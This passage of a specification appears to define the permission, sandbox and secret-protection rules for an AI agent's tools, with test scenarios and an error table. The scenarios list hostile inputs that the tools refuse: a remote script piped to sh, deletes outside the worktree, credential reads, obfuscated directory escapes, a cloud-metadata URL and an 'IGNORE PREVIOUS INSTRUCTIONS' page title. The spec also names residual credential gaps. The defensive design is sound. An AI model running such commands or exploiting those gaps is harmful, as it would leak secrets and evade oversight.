or system config with a repo's `credential.helper` reset, no prompts, a
key-less `GIT_SSH_COMMAND`, gh reading an empty config dir. The spawn goes
through `spawnCapped` with the calling run's abort signal, the runners' 10
minute timeout (exit 124) and 64 KiB per-stream cap, its process group killed
on timeout or abort (exit 130); a shell that cannot start returns exit 127,
and the output is secret-scrubbed (vendor-key shapes and the literal value
of every set secret env var). git also gets empty command-line
`http.extraHeader` and `http.https://github.com/.extraHeader` values, so a
stored `Authorization` header in the repo's config is not sent. Residual: a
repo config that embeds a token in a remote URL, or includes another file
(`include.path`, `includeIf`); on-disk credentials a process
reads without git or gh (an interpreter opening `~/.ssh/id_*`, `ssh` started
by a program), and tools with their own credential stores (`cargo publish`
with `~/.cargo/credentials.toml`, npm tokens); a sandbox (G13) is deferred.


File write/edit are `mutating: true` even when `dangerous: false` (ROLES-CHAT-5).
When `CORVIDINHO_ACTING_IS_ADMIN` is set (Discord/WATCH/schedule acting session),
the acting role (IDENTITY-8..12, REQ-plugins-065) is resolved at every call by
`resolveActingRole` (`src/plugins/roles.ts`): `owner` (the ADMIN re-check:
bridge bit + configured owner, not muted or deny-listed) runs every mutating
plugin, still behind SAFE-1 for dangerous tools (ROLES-CHAT-4 / IDENTITY-9);
`team` — only when the spawning surface stamped `CORVIDINHO_ACTING_ROLE=team`
(Discord chat, slash, buttons) and the owner's people list, re-read now,
declares the acting Discord id team — runs only `TEAM_REVIEW_TOOLS`
(`github-issue-comment`, `github-pr-review`) plus, in a `/work` run
(`CORVIDINHO_ACTING_WORK_TASK=1`), `TEAM_WORK_TOOLS` (`files-write`,
`files-edit`, `specsync-change-new`, `specsync-change-answer`,
`specsync-change-approve`, `specsync-change-finalize`); `community` (everyone else: undeclared, declared community,
WATCH, schedules, workers, muted / deny-listed, any read failure) runs none
(IDENTITY-10/11). Refusals are "not allowed for your role" (ROLES-CHAT-3/6).
A team `github-pr-review` posts as `COMMENT` only: `--event APPROVE` /
`REQUEST_CHANGES` get the role refusal (exit 2) unless the role, re-resolved
at the call, is owner or there is no role session. In a team `/work` run
`files-write` / `files-edit` refuse a secret-looking path (`isSecretPath`,
exit 2) like the read tools, so an edit is never a read oracle (ROLES-CHAT-8).
`roleAllowsPlugin(role, cmd, workTask)` is the one rule for `runPlugin` and
the catalog (REQ-agent-065); with no stamp the ADMIN bit alone caps at owner
(`actingRoleCap`), and a stamp never raises the role.

Community role sessions may call GitHub read tools against any *public*
repository after deny-list checks (ROLES-CHAT-8). Private or unknown
visibility is refused. Team reads pass on a GITHUB-6-allowlisted or confirmed
public repo; GitHub writes (`checkRepoGateForActingRole(repo, { write: true
})`: issue create/comment, PR create/review) pass for team only on an
allowlisted repo and are refused for community (IDENTITY-10). Owner / non-role
sessions keep the GITHUB-6 allowlist gate.

Scheduled runs read and act only on allowlisted repos, even public ones
(DISCORD-SCHEDULE-3.a, REQ-plugins-496). `src/plugins/roles.ts` exports
`SCHEDULE_SESSION_PREFIX` (`schedule_`, from which the scheduler builds its
run session id) and `isScheduleRunEnv(env)` (true when
`CORVIDINHO_DISCORD_SESSION_ID` starts with it; `delegate` / `council`
workers inherit that key, since the worker env drops only `DISCORD_*`,
`CORVIDINHO_ACTING_*` and the token keys). In such an env
`checkRepoGateForActingRole` refuses a repo that fails `checkGithubRepo`
(the GITHUB-6 allowlist, deny wins) right after the deny lists, for every role
and with no visibility lookup, naming DISCORD-SCHEDULE-3.a; what passes still
goes through the role rules above (a community run's reads still need a
confirmed-public repo, its writes stay refused). That one gate covers every
`github-*` command, the review readers and the docs / milestone readers.
`web-fetch` in such an env refuses, in the shared per-hop URL rule (first hop
and every redirect, before DNS), any URL on `github.com`, a `*.github.com`
host, `githubusercontent.com` or a `*.githubusercontent.com` host that does
not name an `OWNER/REPO` passing `checkGithubRepo`; only `/<owner>/<repo>/…` on
`github.com`, `www.github.com`, `codeload.github.com` and
`raw.githubusercontent.com` and `/repos/<owner>/<repo>/…` on `api.github.com`
name one (a trailing `.git` dropped), so gists, other API routes and other
GitHub hosts are refused; the allowlist is read once per call for the run's
env (an unreadable one refuses every GitHub hop). Other hosts and every other
run are unchanged.

ROLES-CHAT-8.a (REQ-plugins-066, `plugins/github/public-docs.ts`): the
community site / roadmap sources are the public repo docs and the public
issues and milestones of allowed public repos, read with
`github-docs-read` (README by default, a root `STATUS*` / `CHANGELOG*` file or
anything under `docs/`, a directory listed; any other path refused with exit
2 for every role before GitHub is called, `publicDocPath`; non-owner role
sessions also refuse a secret-looking doc path and never list one,
`isSecretPath`; text SAFE-6 scrubbed, capped at 64 KiB, labelled untrusted)
and `github-milestone-list`
(`issues.listMilestones`, `--state`, `--limit` ≤100) — both read-only,
minTier 0, behind the acting role's repo gate. `web-fetch` stays dangerous,
so no site URL is a community source.

`files-read` refuses secret-looking paths (`.env*`, `.ssh`, keystores, key
files) for non-ADMIN role sessions via `isSecretPath`. `search-grep`,
`files-list` and `git-diff` refuse an explicit secret path the same way (also
through a symlink), and `search-grep`, `git-diff`, `files-glob` and
`files-list` leave secret paths out of their results, whatever `--include`,
glob or `--staged` is passed (REQ-plugins-267). ADMIN and the local CLI keep
the access `files-read` gives.

`files-read` image mode (DISCORD-9 / REQ-plugins-427): after the path clamp,
the ROLES-CHAT-8 secret gate and the existing-file check, a file whose leading
bytes are PNG, JPEG, GIF or WebP (`sniffImageMediaType` in
`plugins/files/image.ts`; the name does not count) is returned as an image:
`data` `{path, bytes, mediaType, image: true}`, message `image <path> (<mime>,
N bytes) opened for viewing`, no UTF-8 `content`. The bytes ride base64 only on
`PluginHandlerResult.image` (`PluginImage` `{path, mediaType, base64}` in
`src/plugins/types.ts`), which no tool text, event, ndjson frame or CLI output
serializes; the agent tool loop turns it into an image part (REQ-agent-428).
An image over `MAX_IMAGE_SIZE_BYTES` (20 MB, the Discord attachment cap) is
refused. Every other file reads exactly as before.

SAFE-5 audit chain (REQ-plugins-095): once `audit_log` holds a keyed row it
stays keyed. `appendAudit` without `CORVIDINHO_AUDIT_HMAC_KEY` refuses to
append after a keyed row (a dangerous run is then refused, fail closed), and
`verifyAudit` with the key reports an unkeyed row after a keyed row as the
break. An unkeyed prefix followed by keyed rows still verifies as mixed.
Rewriting every keyed row as unkeyed (from the first keyed row on) or dropping
the newest rows is not detectable from the DB alone; it needs an anchor kept
outside the DB. `formatAuditLine` (the bridge start log and `/status`) reads
`chain BROKEN at #N` for any break verify finds with the key, and also
without the key when the break comes before any keyed row (`keyedRows` is
counted up to the break, so it is 0): a tampered unkeyed row needs no key to
be seen. Only a verify that stops at a keyed row without the key reads
`cannot verify keyed rows (CORVIDINHO_AUDIT_HMAC_KEY not set)`.

SpecSync tools stay inside the project (SPECSYNC-1 / SPECSYNC-5 / SPECSYNC-6,
PLUGIN-1, REQ-plugins-008).
`specsync-read` / `specsync-brief` take only a plain module name
(`[A-Za-z0-9_-]+`, the registry form; optional `name=` prefix): an absolute
path, `.` / `..`, a path separator, NUL or any other character is refused
(exit 1, nothing read, the name JSON-escaped in the error). Every file they
read (module spec, legacy flat spec, companions) must realpath inside the real
`specs/` dir, which must itself realpath inside the project root; a symlinked
specs dir, module dir, spec or companion that leaves it is refused (a refused
companion fails the whole brief) and its content is never returned; the
Planning spec briefing reads through the same helpers and skips it too.
`specsync-coverage`, `specsync-score`, `specsync-change-list` and
`specsync-ship-status` refuse a forwarded `--root` / `--root=…` (exit 1) before
spawning `specsync`. `specsync-list` and `specsync-check` take no path input.

`specsync-list` (and the Planning briefing's module list) lists, sorted and
each name once, in a SpecSync project (`.specsync/` is a dir, the layout
`specsync init` / `specsync scaffold` leave) each
`specs/<name>/<name>.spec.md` that `specsync-read` would read: a plain module
name whose spec is a file resolving inside the real `specs/` dir (a legacy
flat `specs/<name>.md`, a dir without its spec, or a spec or module dir that
links outside `specs/` is not listed). No `.specsync/` dir, no `specs/` dir, or
a `specs/` dir resolving outside the project adds no name from `specs/`. When
`.specsync/registry.toml` exists its `[specs]` names are listed too: SpecSync
does not keep that file in step with `specs/` (`specsync init` writes none,
and `specsync scaffold` does not add to the one `specsync init-registry`
writes), so a registry never hides a module under `specs/` (SPECSYNC-1/5).

`specsync-check` runs `fledge run spec-check` only when fledge is on PATH and
the project's own `fledge.toml` defines a `spec-check` task; with no
`fledge.toml` or no such task it runs the local `specsync check` (the
project's `.specsync` config decides its rules) instead of failing on an
unknown Fledge task. A `fledge.toml` that cannot be parsed keeps the Fledge
path (fail closed). `specsync-score` (SPECSYNC-3) is read-only (tier 0, not
dangerous, no API key) and returns the local `specsync score` report with the
forwarded args (module filters, `--explain`, `--format json`).
`specsync-coverage`, `specsync-change-list` and `specsync-ship-status` refuse a
forwarded `--root` / `--root=…` (exit 1) before spawning `specsync`.
`specsync-list` and `specsync-check` take no path input.

SpecSync change tools (AGENT-18, REQ-plugins-518): `specsync-change-status`
(read-only, tier 0) returns `specsync change status [id]`.
`specsync-change-new` and `specsync-change-answer` are mutating, not
dangerous, minTier 2 (code), in `TEAM_WORK_TOOLS` (a team member's own
`/work`), and refuse `--root` (exit 1) and, when the project's SpecSync change
workflow is off (`repoWaysNow`: working tree, HEAD and the run's base, merged
with the run's start scan), `SDD_OFF_REFUSAL` (exit 2), before spawning
anything. `specsync-change-new` passes its args to `specsync change new` and
records the change ids its spawn added (the `.specsync/changes` listing
before and after) in the run's ledger (`data.opened`).
`specsync-change-answer <id> <question> <answer…>` takes a slug id (no path,
no flag) and joins the rest into one answer. In a hi repo an
`acceptance_criteria` answer must cite hi ids (`FAMILY-N[.x]` of a family
`hi export` lists) and every one cited must be a criterion `hi export` shows
(retired ones are not): none cited, one not captured, or `hi export`
unreadable refuses (exit 2) and nothing is spawned. Other questions and repos
without hi are not checked. `specsync` and `hi` are found on the PATH in
effect at the call.

Own-change approve and archive (AGENT-18.a, REQ-plugins-519):
`specsync-change-approve <id>` and `specsync-change-finalize <id>` are
dangerous (SAFE-1 allowlist in non-interactive runs, SAFE-5 audit), minTier
2, `agentTool: false` (never in the model's catalog, even allowlisted), in
`TEAM_WORK_TOOLS`, and refuse `--root`, a workflow that is off, a bad id or
extra args. Each then calls `selfLifecycleRefusal` and refuses (exit 2) with
its line unless: the run is not a delegate or council worker, not WATCH
(`CORVIDINHO_WATCH_SESSION_ID`), not a schedule (session prefix or surface
stamp) and not a community role; the project is Corvidinho itself
(`isCorvidinhoProject`), else `HUMAN_LIFECYCLE_LINE` (a human approves,
reviews and finalizes); the id is one this run's ledger recorded; and
`runTask` is settling it right after a green lane. Approve spawns
`specsync change approve <id> --actor corvid-agent`; finalize spawns
`specsync change check <id>`, `specsync change review <id> --reviewer
corvid-agent` and `specsync change finalize <id>` in order and stops at the
first failure, naming the step.
Language runners (PLUGIN-4, REQ-plugins-313..314): at builtin load each of
`node`, `python3` (else `python`) and `cargo` is resolved with `Bun.which` over
the absolute entries of PATH only, skipping a hit that is the running Bun
binary (the `node` shim `bun run` adds); a found toolchain registers `node-exec` /
`python-exec` / `cargo-exec` bound to that absolute binary, a missing one
registers nothing (never offered, never a tool that cannot start). Each runner
is `dangerous: true`, `minTier: 2`, and spawns `[bin, ...argv]` (no shell) with
cwd = the plugin cwd, the verify lane's scrubbed env (`buildVerifyEnv`) minus
`CDPATH` / `OLDPWD` and without GitHub or git credentials (SAFE-21.a,
REQ-plugins-495) plus `CORVIDINHO_PROJECT_ROOT`, stdin closed, a 10 minute
timeout (exit 124), 64 KiB per-stream caps, and its process group killed on
timeout or the calling run's abort (exit 130); output is secret-scrubbed. Empty
argv is a usage error (exit 1, nothing spawned); a binary that cannot start
returns exit 127. `plugins list` prints which runners loaded (with the binary)
and one line per missing toolchain, and still exits 0. `shell-exec` is
always registered and uses the same env. The pinned cwd is where the runner starts,
not a sandbox: the code it runs can `process.chdir` / `os.chdir`, and
`cargo --manifest-path` can name another crate; no SAFE-3 `cd` clamp applies
(the runners add no shell). They are gated like `shell-exec` instead:
dangerous, SAFE-1 allowlist, code tier, ADMIN only.

Fledge core builtins (PLUGIN-1, REQ-plugins-461) are always registered and run
the fledge binary found, when the command runs, on the absolute PATH entries
only (none → ok=false, exit 127 `<name>: fledge not on PATH`), as
`[fledge, "--non-interactive", ...]` argv arrays (no shell) with cwd = the
plugin cwd: `fledge-lanes-list` → `lanes list --json` (no args), typed
`{count, lanes: [{name, description, steps, failFast, trustTier}]}`;
`fledge-lanes-validate` → `lanes validate --json` plus `--strict` when that is
the only arg (any other arg, a path included, is a usage error), typed
`{valid, strict, laneCount, errors, warnings}` and ok=false when fledge
reports an error (or a warning under `--strict`); both `dangerous: false`,
minTier 0, 30 s timeout. `fledge-lanes-run` → `lanes run <lane>` (exactly one
lane name) and `fledge-run` → `run <task>`, plus `-- <args…>` verbatim when
args follow the task; both `dangerous: true`, minTier 2 (they run the
project's own commands, like `shell-exec`), 10 minute timeout, ok only on
exit 0, a failing lane / task returns fledge's exit code and output. A lane or
task name must match `FLEDGE_NAME_RE` (`^[A-Za-z0-9][A-Za-z0-9_.:-]{0,63}$`,
no leading `-`), so model argv never becomes a fledge option (`--init`,
`--list`, `--lang`, `--dry-run`, `--from`); a refused name spawns nothing
(usage error, exit 1). The child env is the verify lane's scrub
(`buildVerifyEnv`) minus `CDPATH` / `OLDPWD` and without the owner's GitHub
or git credentials (`withoutGitCredentials`, the env `shell-exec` and the
runners get, SAFE-21.a / REQ-plugins-495; the model may be offered the lane
and task runs under SAFE-3.a) plus `FLEDGE_NON_INTERACTIVE=1`
and `CORVIDINHO_PROJECT_ROOT`; stdin closed, 64 KiB per-stream caps, process
group killed on timeout (exit 124) or the calling run's abort (exit 130);
output and parsed fields are secret-scrubbed, parsed fields control-char
cleaned and capped. fledge prints the offending line of a lane source it
cannot parse, so before either read starts fledge, `fledge.toml`, the
`.fledge/lanes` dir and each `.fledge/lanes/*.toml` that exists must resolve
(symlinks followed) inside the real project root, to a regular file (the dir
to a directory), at a path that is not a secret path as named or as resolved
(`isSecretPath`); otherwise `laneSourcesRefusal` names the project-relative
path and the read is refused (exit 2, fledge not started; ROLES-CHAT-8, as
`files-read`). The runs are not clamped (code tier, ADMIN only, allowlisted
like `shell-exec`). Builtins load before the project's Fledge plugins, so a
Fledge plugin command named `run`, `lanes-list`, `lanes-validate` or
`lanes-run` is skipped by that load with `name already registered by builtin`
(REQ-plugins-112), as fledge's own `run` shadows such a plugin command on its
command line.

## Behavioral Examples

### Scenario: memory-store description shows argv example

- **Given** builtins are loaded
- **When** an operator or the tool loop inspects `memory-store`
- **Then** the description includes `--category` / `person` / `identity` example argv

### Scenario: SAFE-3 refuse cd outside root

- **Given** builtins loaded and `shell-exec` allowlisted
- **When** the agent runs `shell-exec` with `cd /tmp && pwd`
- **Then** the run fails with exit 2 and a SAFE-3 refuse message; no spawn outside root

### Scenario: relative cd inside root

- **Given** a project with subdirectory `sub`
- **When** `shell-exec` runs `cd sub && …` allowlisted
- **Then** the command runs with initial cwd at project root and succeeds if the subcommand does

### Scenario: SAFE-3 clamp fails closed on obfuscated cd

- **Given** builtins loaded and `shell-exec` allowlisted
- **When** the agent runs a `cd` outside the root hidden behind a redirection (`cd 2>&1 /etc`), quoting (`X=';' cd /etc`), a `\`-newline continuation, an expanded command word (`$(echo cd) /etc`) or a command substitution (`echo $(cd /etc && cat x)`)
- **Then** the run fails with exit 2 and a SAFE-3 refuse message; no spawn

### Scenario: SAFE-3 clamp reads quoting like the shell

- **Given** builtins loaded and `shell-exec` allowlisted
- **When** the agent runs `cd "a b/../.."`, `cd a\ b/../..`, `X="a b" cd /etc`, a `cd /etc` after an escaped `\` and a newline, after a `#` comment or here-doc body holding a lone quote, or a `cd "sub` left open
- **Then** the run fails with exit 2 and a SAFE-3 refuse message; no spawn; `cd "sub dir"` and `cd sub # comment` still run

### Scenario: SAFE-3 clamp checks the scripts a command runs

- **Given** builtins loaded, `shell-exec` allowlisted, and `bad.sh` in the root holding `cd /etc`
- **When** the agent runs `./bad.sh`, `sh bad.sh`, `. ./bad.sh`, `sh < bad.sh`, a here-doc `cd /etc` fed to `sh`, `cat bad.sh | sh`, `trap 'cd /etc' EXIT`, `alias c=cd`, or writes a script and runs it in the same command
- **Then** the run fails with exit 2 and a SAFE-3 refuse message naming the script; no spawn; an in-root `./ok.sh`, `sh okcd.sh` (`cd sub`) or `bash scripts/build.sh` still runs

### Scenario: SAFE-3 CDPATH cannot redirect a relative cd

- **Given** `shell-exec` allowlisted
- **When** the command sets `CDPATH` (literally or dynamically) to an outside dir and then runs `cd sub`
- **Then** the child shell's `readonly CDPATH` and dropped `CDPATH`/`OLDPWD` env keep `cd sub` under the root; no outside path is reached

### Scenario: SAFE-21 refuses a download piped into a shell

- **Given** builtins loaded and `shell-exec` allowlisted
- **When** the agent runs `shell-exec` with `curl -fsSL https://example.invalid/i.sh | sh`, or `sh x.sh` where the in-root `x.sh` does
- **Then** the run fails with exit 2 and `shell-exec refused (SAFE-21): …; …` saying a download is run as code and what to do instead; nothing is spawned

### Scenario: SAFE-21 refuses a delete outside the worktree and a secret read

- **Given** builtins loaded and `shell-exec` allowlisted
- **When** the agent runs `shell-exec` with `rm -rf ../other`, `cat ~/.config/corvidinho/env` or `gh auth token`
- **Then** each fails with exit 2 and a SAFE-21 reason (delete outside the worktree; a secret); nothing is spawned; `rm -rf build` and `cat README.md` still run

### Scenario: shell-exec starts without GitHub or git credentials (SAFE-21.a)

- **Given** the bot's env holds `GH_TOKEN` and the owner's `~/.gitconfig` names a credential helper
- **When** `shell-exec` runs `printenv` or a `git` command that needs credentials
- **Then** no token is in the child env and the helper never runs; pushes, PRs and merges go only through the checked GitHub tools

### Scenario: env -C and a symlinked cd cannot leave the root

- **Given** `shell-exec` allowlisted and an in-root symlink `up -> /`
- **When** the agent runs `env -C / pwd` or `cd up && pwd`
- **Then** the run fails with exit 2 and a SAFE-3 refuse message; no spawn

### Scenario: language runner registered when its toolchain is on PATH

- **Given** `node` is on PATH and `CORVIDINHO_ALLOWLIST` names `node-exec`
- **When** a non-interactive run calls `node-exec` with `["-e","console.log(process.cwd())"]`
- **Then** node runs with that argv (no shell) in the project root and prints it; without the allowlist entry the run is denied (exit 2, SAFE-1)

### Scenario: missing toolchain degrades cleanly

- **Given** `cargo` is not on PATH
- **When** builtins load and an operator runs `corvidinho plugins list`
- **Then** `cargo-exec` is not registered or offered, the list prints `cargo-exec not loaded: cargo not found on PATH`, and exits 0 with every other builtin listed

### Scenario: Fledge itself as typed commands

- **Given** builtins are loaded, fledge is on PATH and the project's `fledge.toml` defines a `verify` lane
- **When** a tool-tier run calls `fledge-lanes-list`, and a non-interactive run with `CORVIDINHO_ALLOWLIST` naming `fledge-lanes-run` calls it with `["verify"]`
- **Then** the list comes back typed (lane names, step counts, descriptions) without an allowlist entry, and `fledge --non-interactive lanes run verify` runs in the project root; without the allowlist entry the lane run is denied (exit 2, SAFE-1) and fledge never starts

### Scenario: SpecSync tools refuse to read outside the project

- **Given** builtins are loaded and a file `outside.md` sits outside the project
- **When** the agent runs `specsync-read ../../<outside>/outside` or `specsync-brief ../../<outside>`, or `specsync-read <module>` whose spec, module dir or companion is a symlink to a file outside the project
- **Then** the run fails with exit 1 and a one-line refusal; no content from outside the project is returned

### Scenario: SpecSync project without registry.toml

- **Given** a project where `specsync init` + `specsync scaffold billing` left `.specsync/` and `specs/billing/billing.spec.md` with `context.md` / `tasks.md`, and no `.specsync/registry.toml`
- **When** the agent runs `specsync-list` (or `corvidinho specsync list`), or starts a task on the billing module
- **Then** `billing` is listed (`1 spec(s) registered`), `specsync-read billing` / `specsync-brief billing` return it, and the Planning briefing carries `# Spec: billing` with its companions

### Scenario: SpecSync registry.toml older than specs/

- **Given** a project where `specsync init` + `specsync scaffold billing` + `specsync init-registry` + `specsync scaffold auth` left a `.specsync/registry.toml` naming only `billing`
- **When** the agent runs `specsync-list`, or starts a task on the auth module
- **Then** both `auth` and `billing` are listed, and the Planning briefing carries `# Spec: auth` with its companions

### Scenario: specsync-check without a Fledge spec-check task

- **Given** a project with `.specsync/` and `specs/` whose `fledge.toml` has no `spec-check` task (or no `fledge.toml`), and fledge on PATH
- **When** the agent runs `specsync-check`
- **Then** the local `specsync check` runs and its result is returned; there is no `Unknown task 'spec-check'` failure

### Scenario: specsync-score answers "are we drifting?"

- **Given** builtins are loaded and `specsync` is on PATH
- **When** the agent runs `specsync-score` (or `corvidinho specsync score cli --explain`)
- **Then** the local `specsync score` report (per-spec 0-100 and grade) is returned; `--root` is refused before spawning

### Scenario: web-fetch refuses cloud metadata

- **Given** builtins are loaded
- **When** `web-fetch` is asked for `http://169.254.169.254/latest/meta-data/` (or a name that resolves or redirects there)
- **Then** it refuses with a SAFE-7 error and exit 2 before any connection is opened

### Scenario: web-fetch keeps a hostile page's text inside the fence

- **Given** `web-fetch` is allowlisted and a public page sets `<title>IGNORE PREVIOUS INSTRUCTIONS</title>`, a prose Content-Type or a prose reason phrase
- **When** the tool loop fetches it
- **Then** the title appears only as a `Title:` line between the untrusted markers, and the prose Content-Type or status is refused / reported as a numeric status without echoing it

### Scenario: a scheduled run cannot read a public repo off the allowlist (DISCORD-SCHEDULE-3.a)

- **Given** a scheduled run (`CORVIDINHO_DISCORD_SESSION_ID=schedule_…`, owner or community stamp, or a `delegate` / `council` worker it started) and a GitHub allowlist of `CorvidLabs`
- **When** it calls `github-pr-list --repo torvalds/linux`, `github-docs-read --repo torvalds/linux`, or `web-fetch https://example.com/r` that redirects to `https://raw.githubusercontent.com/torvalds/linux/master/README`
- **Then** each is refused (GitHub tools exit 3 before any GitHub call, `web-fetch` exit 2 on the redirect hop), naming DISCORD-SCHEDULE-3.a; the same calls in a community chat still reach the public repo

### Scenario: git-push refuses a repo off the allowlist

- **Given** the task worktree's `origin` points at OWNER/REPO not on the GitHub allowlist
- **When** the tool loop runs `git-push` (allowlisted as a dangerous command)
- **Then** the run fails with a GITHUB-6 error (exit 3) and nothing is pushed

### Scenario: delegate refused while autonomous mode is off

- **Given** a project without `[corvidinho.autonomous] enabled = true`
- **When** `delegate` runs (tool loop or `plugins run`)
- **Then** it fails with exit 2 citing AUTONOMOUS-1 and no worker is spawned

### Scenario: council voices cannot act

- **Given** an autonomous-enabled project and a code-tier lead whose allowlist names `shell-exec`
- **When** the lead runs `council --question ...`
- **Then** every voice runs `task run` at read tier with `CORVIDINHO_ALLOWLIST` empty and `CORVIDINHO_ACTING_IS_ADMIN=0`, and the result carries the chair's decision

### Scenario: files-read opens an attached screenshot as an image (DISCORD-9)

- **Given** a PNG at `<cwd>/.corvidinho/attachments/m-0.png`
- **When** `files-read` runs on that path
- **Then** it returns `data.image` true with `mediaType` `image/png` and no `content`, and the file's bytes only on `result.image` (base64) for the tool loop

### Scenario: non-ADMIN refused files-write (ROLES-CHAT-3)

- **Given** builtins loaded and `CORVIDINHO_ACTING_IS_ADMIN=0` with an acting Discord user
- **When** the agent runs `files-write`
- **Then** the run fails with exit 2 and a "not allowed for your role" message; no file is written

### Scenario: ADMIN files-write still allowed (ROLES-CHAT-4)

- **Given** `CORVIDINHO_ACTING_IS_ADMIN=1` and the acting user is the configured owner
- **When** the agent runs `files-write` under non-interactive
- **Then** the write succeeds (mutating but not dangerous); SAFE-2 protected paths still refuse

### Scenario: non-ADMIN search-grep never returns secret lines (ROLES-CHAT-8)

- **Given** `CORVIDINHO_ACTING_IS_ADMIN=0` and a project with `.env` holding a key
- **When** the agent runs `search-grep OPENAI_API_KEY .env`, or `search-grep <pattern>` over the project with any `--include`
- **Then** the explicit path is refused with exit 2 like `files-read`, and the recursive search returns no line from `.env*`, `.ssh`, key or keystore files

### Scenario: non-ADMIN git-diff never shows a tracked secret file (ROLES-CHAT-8)

- **Given** `CORVIDINHO_ACTING_IS_ADMIN=0` and a repo with a tracked, modified `certs/server.pem` and `src/a.ts`
- **When** the agent runs `git-diff`, `git-diff --staged` or `git-diff certs/server.pem`
- **Then** the diff shows `src/a.ts` only, and the explicit secret path is refused with exit 2 like `files-read`

## Error Cases

| Condition | Behavior |
|-----------|----------|
| Unknown plugin name | Throw / fail with Unknown plugin command |
| Dangerous + non-interactive + not allowlisted | Deny (exit 2) |
| Mutating + acting non-ADMIN (ROLES-CHAT-3) | Deny (exit 2, not allowed for your role) |
| Team role, mutating tool outside its review tools (and work tools in /work) (IDENTITY-10) | Deny (exit 2, not allowed for your role) |
| Team GitHub write on a repo not on the GITHUB-6 allowlist (IDENTITY-10) | Refuse (exit 3, GITHUB-6) |
| `github-docs-read` path outside README / docs/ / STATUS / CHANGELOG (ROLES-CHAT-8.a) | Refuse (exit 2) before GitHub is called |
| Missing token / API fail on github-* | Clear error; non-zero exit |
| Dangerous github write + non-interactive + not allowlisted | Deny (exit 2, SAFE-1) |
| github write + empty/missing repo allowlist | Refuse (exit 3, GITHUB-6) |
| Path escapes project cwd / symlink escape (incl. dangling link target or loop) | Refuse (exit 1) |
| specsync-read/brief name not a plain module name, or a spec/companion/specs dir whose real path leaves the project specs dir | Refuse (exit 1); nothing read |
| specsync-coverage/score/change-list/ship-status given `--root` | Refuse (exit 1); specsync not spawned |
| specsync-list / Planning briefing with no `.specsync/registry.toml`, or one naming only some modules | List `specs/<name>/<name>.spec.md` modules that stay inside `specs/` (only when `.specsync/` is a dir) plus any registry names; none → `0 spec(s) registered`, no briefing |
| specsync-check, fledge on PATH but the project defines no `spec-check` task | Run local `specsync check` (no `Unknown task` failure) |
| specsync-check, project `fledge.toml` unparsable | Keep `fledge run spec-check` (fail closed; Fledge reports the error) |
| Write/edit/delete protected infra | Refuse (exit 2, SAFE-2); no override |
| shell-exec cd/pushd escapes project root (incl. `cd -`, options, prefix words, redirections, quoting incl. bash `$'…'`, `\`-newline, comments, here-docs, expanded command words, command substitutions, `eval` and shell `-c` strings, DIRSTACK) | Refuse (exit 2, SAFE-3); no spawn |
| shell-exec cd/pushd left open by an unterminated quote or trailing `\`, or a command nested too deeply to check | Refuse (exit 2, SAFE-3); no spawn |
| shell-exec runs a script (sourced, `BASH_ENV` / `--rcfile`, shell operand or input, here-doc / here-string, run by path) whose cd/pushd escapes, or a `trap` action that does, or defines an alias | Refuse (exit 2, SAFE-3) naming the script; no spawn |
| shell-exec runs a script the clamp cannot check: path would expand, sourced / shell-run file missing, over 1 MiB of script text or 32 scripts, written by the same command, shell input that would expand, or a shell reading a pipe / inherited stdin / process substitution | Refuse (exit 2, SAFE-3); no spawn |
| shell-exec sets CDPATH (literal or dynamic) then runs a relative cd | Child shell `readonly CDPATH` + dropped env keep the cd in-root (SAFE-3) |
| shell-exec `env -C` / `--chdir` / `sudo -D` outside the root, `cd` / `pushd` through an in-root symlink that points out (or cannot be walked), an `ln` whose target leads out, or a wrapper string the clamp cannot read (`env -S`, `sudo -s`) | Refuse (exit 2, SAFE-3); no spawn (REQ-plugins-495) |
| shell-exec `sed -i` / `--in-place` or an output redirection to a file in the typed command | Refuse (exit 2, SAFE-21 edit: use files-write / files-edit); no spawn (REQ-plugins-494) |
| shell-exec downloads and runs the download as code (piped into a shell / interpreter, `$(curl …)`, `<(curl …)`, a downloaded script run), in the command or an in-root script it runs | Refuse (exit 2, SAFE-21 download); no spawn (REQ-plugins-494) |
| shell-exec deletes or moves outside the worktree (`rm`, `rmdir`, `unlink`, `shred`, `mv`, `find -delete` / `-exec rm`, `ln -f`, `git worktree remove` / `prune`), deletes the worktree itself, or names an expanded / input-fed / dot-matching target, in the command or an in-root script | Refuse (exit 2, SAFE-21 delete); no spawn (REQ-plugins-494) |
| shell-exec reads a secret (secret path, host credential store, Corvidinho env / allowlist file or config dir, `/proc/<pid>/environ`, credential env var, `gh auth token`, `git credential`, ssh family) or re-points git / gh at credentials, in the command or an in-root script | Refuse (exit 2, SAFE-21 secret); no spawn (REQ-plugins-494) |
| shell-exec or a runner child looks for GitHub / git credentials | None: tokens, askpass, ssh agent dropped; git reads no global / system config, repo helper reset, no prompt, key-less ssh; gh config dir empty (SAFE-21.a, REQ-plugins-495) |
| shell-exec runs past its timeout / the calling run aborts / prints past the cap | exit 124 / 130 with its process group killed; output truncated at 64 KiB per stream with a note; output secret-scrubbed (REQ-plugins-495) |
| Dangerous run with no audit key while the audit chain is keyed | Refuse (exit 2, SAFE-5 audit log unavailable); handler not run |
| web-fetch to a non-public target (literal, DNS answer or redirect hop) | Refuse before connecting (exit 2, SAFE-7) |
| web-fetch non-http(s) scheme or URL credentials | Refuse (exit 2) |
| web-fetch URL or redirect carrying a secret-looking value | Refuse before DNS (exit 2, SAFE-6) |
| web-fetch non-interactive + not allowlisted | Deny (exit 2, SAFE-1) |
| web-fetch > 5 redirects | Refuse (exit 2) |
| Scheduled run (or its worker): GitHub tool on a repo off the GITHUB-6 allowlist, public or not (DISCORD-SCHEDULE-3.a) | Refuse (exit 3) before any GitHub call, no visibility lookup |
| Scheduled run: web-fetch hop (first or redirect) to a GitHub host not naming an allowlisted OWNER/REPO, or with the allowlist unreadable (DISCORD-SCHEDULE-3.a) | Refuse before DNS (exit 2) |
| web-fetch non-text or malformed content-type / compressed body / non-2xx / timeout / every checked address unreachable | Error (exit 1); nothing returned |
| git plugin cwd not a repo top level | Refuse (exit 2, SAFE-3) |
| git-commit stages protected delete / `.env*` / keystore / `.git` | Refuse (exit 2) |
| git force / amend / `--all` / refspec / other-branch push | Refuse (exit 2) |
| git-branch-create switch would overwrite an ignored / untracked local file (e.g. `.env`) | Refuse (exit 2, SAFE-2); HEAD and files unchanged |
| git-push remote OWNER/REPO not allowlisted or denied | Refuse (exit 3, GITHUB-6) |
| git-push non-fast-forward | Fail (exit 1); never retried with force |
| delegate while autonomous off / depth cap / below code tier / budget spent | Refuse (exit 2); nothing spawned |
